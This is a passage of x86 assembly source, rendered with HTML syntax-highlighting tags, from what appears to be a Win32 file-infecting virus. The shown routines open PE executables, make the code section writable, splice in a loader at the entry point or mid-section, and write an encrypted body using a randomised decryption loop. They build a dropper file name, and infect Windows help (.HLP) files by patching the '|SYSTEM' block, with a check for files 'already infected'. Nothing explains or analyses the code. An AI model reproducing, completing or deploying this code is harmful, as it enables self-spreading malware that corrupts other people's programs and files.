        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">SIZE_MBUFF</span><span class="sc0">
</span><span class="sc5">MID_EXIT_CMC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMC</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">MID_EXIT_TWO</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">MAIN_BUFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">FILL_SEC_OFF</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">
</span><span class="sc5">MID_EXIT_TWO</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
</span><span class="sc5">MID_EXIT_ONE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">NO_POP_EXIT</span><span class="sc0">
</span><span class="sc5">MID_RET</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">NO_POP_EXIT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">PEH_CODEBASE.ESI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FIND_CODEOBJ</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">OBJECT_TABLE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_RVA.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">FIND_CODEOBJ</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">OT_FLAG_WRITE</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OT_FLAGS.EDI</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">MID_RET</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">TMP_PATH</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">-</span><span class="sc5">SYS_PATH_DELTA</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;SYS_PATH[EDX]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc5">RW_LOCAL_EXIT</span><span class="sc0">
</span><span class="sc5">CHECK_PATH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMPSB</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_SYS_DIR</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">CHECK_PATH</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc5">NO_SYS_DIR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OT_FLAGS.EDI</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">RW_OR_RO</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">     
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_PHYSICALSIZE.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc5">SIZE_MBUFF</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM</span><span class="sc0">
        </span><span class="sc6">IMUL</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_PHYSICALOFF.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE_BUFF</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">POP_INF_EXIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc5">SHELL_FLAG</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">INF_ENTRYPOINT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FIND_PLACE</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">MIDDLE_INSERT</span><span class="sc0">
</span><span class="sc5">INF_ENTRYPOINT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">PHEADER</span><span class="sc4">[</span><span class="sc5">PEH_ENTRYPOINT.EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_RVA.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_PHYSICALOFF.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE_BUFF</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
</span><span class="sc5">POP_INF_EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GO1_INF_EXIT</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">ENTRY_INSERT</span><span class="sc0">    
</span><span class="sc5">MIDDLE_INSERT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">MAIN_BUFF</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_RVA.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_PHYSICALOFF.EDI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ENTRY_INSERT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">PHEADER</span><span class="sc4">[</span><span class="sc5">PEH_IMAGEBASE.EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">INTRUD_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OLD_PECODE</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_LOADER</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SPE_THUNK</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">SPE32_BUFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">MAIN_BUFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">SIZE_MBUFF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">
</span><span class="sc5">GO1_INF_EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">INF_EXIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">CURRENT_LEN</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">MASK_CR</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">LOOP_CR</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;NOP/NOP</span><span class="sc0">
</span><span class="sc5">LOOP_CR_IMM</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;SUB EDI,2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN_FILL_CRYPT</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90H</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">END_LOOP_CR</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">90H</span><span class="sc0">         </span><span class="sc1">;66H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">LOOP_CR_IMM</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">PHYS_BODY_OFF</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">PHEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEH_NUMOFOBJECT.ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">IMUL</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">OBJECT_TABLE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">PE_HEADER</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">ESI.DOSH_LFANEW</span><span class="sc4">-</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">DOS_HEADER</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">SET_WRITE_FILE</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CORR_SIZE_ECX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">CORR_SIZE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEH_OBJALIGN.ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_ALIGN</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">NO_ALIGN</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEH_OBJALIGN.ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OT_VIRTSIZE.EDI</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">MACRO_FNAME</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">RDROP_NAME</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'\\:C'</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
</span><span class="sc5">STORE_NLETT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">STORE_NLETT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'PMT.'</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">TEMP_EXT</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
</span><span class="sc5">INF_EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">INF_HLP</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">         </span><span class="sc1">;EAX = 0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">FIRST_DROP_MASK</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">RELO_MASK2</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">LODSD</span><span class="sc0">               </span><span class="sc1">;HLP_HEADER</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">HLP_MAGIC</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">INF_EXIT</span><span class="sc0">
</span><span class="sc1">;1. READ BEGIN OF HLP-DIRECTORY</span><span class="sc0">
        </span><span class="sc6">LODSD</span><span class="sc0">               </span><span class="sc1">;HLP_START_DIRECTORYSTART</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">CMPSD</span><span class="sc0">               </span><span class="sc1">;LEA ESI,[ESI+SIZE HLP_START-8]</span><span class="sc0">
        </span><span class="sc6">CMPSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc5">LEN_HLP_DIR</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">;CL=0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">INF_EXIT</span><span class="sc0">
</span><span class="sc1">;2. FIND "|SYSTEM" STRING AND GET OFFSET</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'|'</span><span class="sc0">
</span><span class="sc5">FIND_SYSTEM</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">REPNE</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">INF_EXIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc12">'TSYS'</span><span class="sc0">  </span><span class="sc1">;"|SYSTEM" BLOCK?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">FIND_SYSTEM</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">FILE_HEADER</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">SYSTEM_HEADER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">ESI.HLP_START_ENTIREFILESIZE</span><span class="sc4">-</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">HLP_START</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;STORE NEW "SYSTEM" OFFSET</span><span class="sc0">
</span><span class="sc1">;3. READ SYSTEM PAGE (LENGTH READ BEFORE)</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">SYS_FILE_HEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;OFFSET "SYSTEM" DATA</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">INF_EXIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">FILE_HEADER</span><span class="sc4">)</span><span class="sc5">.SYSTEM_HEADER_MINOR</span><span class="sc4">],</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">INF_EXIT</span><span class="sc0">
</span><span class="sc1">;4. CHECK SECONDS IF FILE ALREADY INFECTED</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">FILE_HEADER</span><span class="sc4">)</span><span class="sc5">.SYSTEM_HEADER_GENDATE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">INF_EXIT</span><span class="sc0">
